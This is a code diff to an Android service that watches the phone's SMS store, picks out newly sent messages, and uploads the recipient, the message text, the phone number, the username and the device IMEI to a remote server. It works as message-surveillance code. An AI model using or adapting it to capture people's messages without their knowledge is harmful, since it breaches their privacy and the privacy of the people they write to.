@@ -81,36 +81,48 @@ public class MessageOutService extends Service{
         @Override
         public void onChange(boolean selfChange) {
             super.onChange(selfChange);
-            Uri uriSMSURI = Uri.parse("content://sms/sent");
-            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
-            cur.moveToNext();
-            String id = cur.getString(cur.getColumnIndex("_id"));
-            if (smsChecker(id)) {
-                setAddress(cur.getString(cur.getColumnIndex("address")));
-                setMessage(cur.getString(cur.getColumnIndex("body")));
-                Log.i("Message",message);
-                try {
 
-                    doc = new JSONObject();
-                    messageJSON = new JSONObject();
+            Uri uriSMSURI = Uri.parse("content://sms");
+            Cursor curre = getContentResolver().query(uriSMSURI, null, null, null, "date DESC LIMIT 1");
+            String body = null;
+            curre.moveToNext();
+            String id = curre.getString(curre.getColumnIndex("_id"));
 
-                    messageJSON.put("Sender", info.getPhoneNumber());
-                    messageJSON.put("ReceiverNumber", getAddress());
-                    messageJSON.put("Text", getMessage());
-                    messageJSON.put("Username", info.getUsername());
-                    messageJSON.put("IMEI", info.getImei());
+            if(curre.moveToFirst()) {
+                //Checking the id of a message to avoid duplicate
+                if (smsChecker(id)) {
+                    String messageType = curre.getString(curre.getColumnIndexOrThrow("type")).toString();
+                    //Checking the type of a message. 2 == sent
+                    if (messageType.equals("2")) {
+                        String type = curre.getString(curre.getColumnIndexOrThrow("type")).toString();
+                        setMessage(curre.getString(curre.getColumnIndexOrThrow("body")).toString());
+                        setAddress(curre.getString(curre.getColumnIndexOrThrow("address")).toString());
 
-                    doc.put("Message", messageJSON);
-                    doc.put("r", "pushMessage");
+                        try {
 
-                    connection = new Connection(doc);
-                    connection.execute();
+                            doc = new JSONObject();
+                            messageJSON = new JSONObject();
 
-                } catch (JSONException e){
-                    e.printStackTrace();
+                            messageJSON.put("Sender", info.getPhoneNumber());
+                            messageJSON.put("ReceiverNumber", getAddress());
+                            messageJSON.put("Text", getMessage());
+                            messageJSON.put("Username", info.getUsername());
+                            messageJSON.put("IMEI", info.getImei());
+
+                            doc.put("Message", messageJSON);
+                            doc.put("r", "pushMessage");
+
+                            connection = new Connection(doc);
+                            connection.execute();
+
+                        } catch (JSONException e){
+                            e.printStackTrace();
+                        }
+                    }
+
                 }
-
             }
+            curre.close();
         }
 
 
